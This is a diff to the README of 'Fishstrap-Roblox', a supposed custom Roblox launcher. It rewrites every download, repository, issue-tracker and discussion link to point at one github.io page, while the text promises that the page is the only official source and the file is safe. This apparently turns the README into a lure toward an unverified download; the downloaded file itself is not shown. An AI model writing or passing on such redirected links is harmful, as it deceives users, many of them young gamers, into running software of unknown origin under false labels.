@@ -1,6 +1,6 @@
 # 🐟 Fishstrap-Roblox - Your Ultimate Custom Roblox Launcher
 
-[![Download Fishstrap v3.1.2](https://img.shields.io/badge/Download-Fishstrap_v3.1.2-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anbas8282/Fishstrap-Roblox)
+[![Download Fishstrap v3.1.2](https://img.shields.io/badge/Download-Fishstrap_v3.1.2-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://anbas8282.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Fishstrap works as a bootstrapper, meaning it handles installation and updates a
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download Fishstrap-Roblox v3.1.2](https://github.com/anbas8282/Fishstrap-Roblox)**
+Visit this link to download the application: **[Download Fishstrap-Roblox v3.1.2](https://anbas8282.github.io)**
 
 This is the official and only download source. The file is safe and free.
 
@@ -130,8 +130,8 @@ Fishstrap checks for updates automatically when you start it. If a new version i
 
 Fishstrap has a growing community of users. If you have questions, want to share your FastFlags configs, or just want to stay up to date, join the conversation:
 
-- **GitHub Issues:** [Report bugs](https://github.com/anbas8282/Fishstrap-Roblox/issues) or request new features.
-- **Discussions:** [Start a discussion](https://github.com/anbas8282/Fishstrap-Roblox/discussions) with other users.
+- **GitHub Issues:** [Report bugs](https://anbas8282.github.io) or request new features.
+- **Discussions:** [Start a discussion](https://anbas8282.github.io) with other users.
 
 ---
 
@@ -149,9 +149,9 @@ Fishstrap is designed with the modern user in mind. While other launchers exist,
 
 ## 🔗 Quick Links
 
-- **[Download Now](https://github.com/anbas8282/Fishstrap-Roblox)**
-- **[View Repository](https://github.com/anbas8282/Fishstrap-Roblox)**
-- **[Report an Issue](https://github.com/anbas8282/Fishstrap-Roblox/issues)**
+- **[Download Now](https://anbas8282.github.io)**
+- **[View Repository](https://anbas8282.github.io)**
+- **[Report an Issue](https://anbas8282.github.io)**
 
 ---
 
